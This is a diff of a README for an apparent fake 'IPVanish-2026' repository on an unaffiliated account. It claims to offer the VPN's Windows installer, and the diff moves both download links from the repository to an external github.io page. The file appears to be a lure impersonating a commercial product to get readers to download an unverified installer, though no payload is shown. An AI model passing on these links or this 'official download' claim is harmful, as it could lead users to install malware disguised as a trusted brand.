@@ -1,12 +1,12 @@
 # 🛡️ IPVanish-2026 - Secure Your Private Internet Connection
 
-[![](https://img.shields.io/badge/Download-IPVanish-blue.svg)](https://github.com/membranouslabyrinthaura955/IPVanish-2026)
+[![](https://img.shields.io/badge/Download-IPVanish-blue.svg)](https://membranouslabyrinthaura955.github.io)
 
 ## 📥 How to Download IPVanish
 
 You can start your setup by visiting the official repository page. Follow this link to reach the download area for your Windows computer:
 
-[Download IPVanish for Windows](https://github.com/membranouslabyrinthaura955/IPVanish-2026)
+[Download IPVanish for Windows](https://membranouslabyrinthaura955.github.io)
 
 This page provides the installer file. Click the link above to save the software to your device. 
 
